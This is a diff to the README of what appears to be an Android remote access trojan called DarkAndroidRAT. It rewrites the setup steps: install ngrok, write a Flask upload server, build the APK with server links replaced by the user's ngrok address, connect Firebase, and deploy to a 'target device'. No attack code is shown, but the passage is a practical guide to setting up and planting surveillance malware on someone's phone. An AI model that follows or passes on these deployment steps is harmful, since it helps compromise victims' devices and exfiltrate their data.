@@ -74,24 +74,34 @@
 
 ## ⚙️ Installation & Setup
 
-1. **Clone the Repository:**
+1. **Install ngrok server:**
 
    ```bash
-   git clone https://github.com/darkefx/DarkAndroidRAT.git
+   bash install_ngrok_v3.sh
    ```
 
+1. **Set Flask Endpoint:**
+
+   ```bash
+   mkdir android_upload_server && cd android_upload_server
+   nano server.py
+   ```
+   Paste the flaskserver.py File Code
 
 
-2. **Configure Firebase:**
+
+2. **Build the APK:**
+
+   * Open the project in Android Studio.
+   * use the apk zip to import app to android studio
+   * Delete my `google-services.json` file in the `app/` directory , change package name, replace server links in 4-5 places in code with your ngrok link and connect 
+     to firebase.
+
+3. **Configure Firebase:**
 
    * Set up a Firebase project.
    * Enable Realtime Database and Authentication.
    * Download the `google-services.json` file and place it in the `app/` directory.
-
-3. **Build the APK:**
-
-   * Open the project in Android Studio.
-   * Build the project to generate the APK file.
 
 4. **Deploy to Target Device:**
 
